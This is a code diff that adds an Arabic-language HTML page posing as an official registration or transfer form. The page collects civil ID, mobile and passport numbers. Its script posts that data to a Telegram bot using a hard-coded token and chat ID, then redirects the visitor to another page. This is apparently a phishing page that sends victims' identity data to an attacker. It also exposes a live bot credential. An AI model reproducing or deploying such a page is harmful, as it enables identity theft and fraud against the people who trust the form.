@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نموذج التسجيل</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <header id="pageHeader">
+        <img src="nowhedar.png" alt="رأس الصفحة" id="headerImage">
+    </header> 
+   <div class="container" id="hedrform">  
+        <img src="R.avif" alt="شعار الإدارة" class="logo">
+    
+        
+        <form id="myForm">
+  <label for="civil-id">الرقم المدني</label>
+  <input type="text" id="civil-id" name="civil_id" required>
+
+  <label for="phone">رقم الجوال</label>
+  <input type="text" id="phone" name="phone" required>
+
+  <label for="passport">رقم الجواز</label>
+  <input type="text" id="passport" name="passport" required>
+
+  <label for="transfer-type">نوع التحويل</label>
+  <select id="transfer-type" name="transfer_type" required>
+    <option value="" disabled selected>اختر نوع التحويل</option>
+    <option value="gov-to-private">تحويل من حكومي إلى أهلي</option>
+    <option value="private-to-gov">تحويل من أهلي إلى حكومي</option>
+  </select>
+
+  <button type="submit">التالي</button>
+</form>
+    </div>
+    <script>
+document.getElementById("myForm").addEventListener("submit", function(e) {
+  e.preventDefault(); 
+
+  const civilId = document.getElementById("civil-id").value;
+  const phone = document.getElementById("phone").value;
+  const passport = document.getElementById("passport").value;
+  const transferType = document.getElementById("transfer-type").value;
+  
+  localStorage.setItem("phoneNumber", phone);
+
+  const message = `📥 معلومات مقدم طلب \n\n🆔 الرقم المدني: ${civilId}\n📱 رقم الجوال: ${phone}\n🛂 رقم الجواز: ${passport}\n🔄 نوع التحويل: ${transferType}`;
+
+  const token = "8104686144:AAEjS7U-SDqptL4qGHH-H7q9NIaLgzvEa0I"; 
+  const chatId = "7595871538"; 
+
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message
+    })
+  })
+  .then(response => {
+    if (response.ok) {
+            window.location.href = "kent.html";
+
+    } else {
+
+    }
+  })
+  .catch(error => {
+    console.error("خطأ:", error);
+  });
+});
+</script>
+</body>
+
+</html>
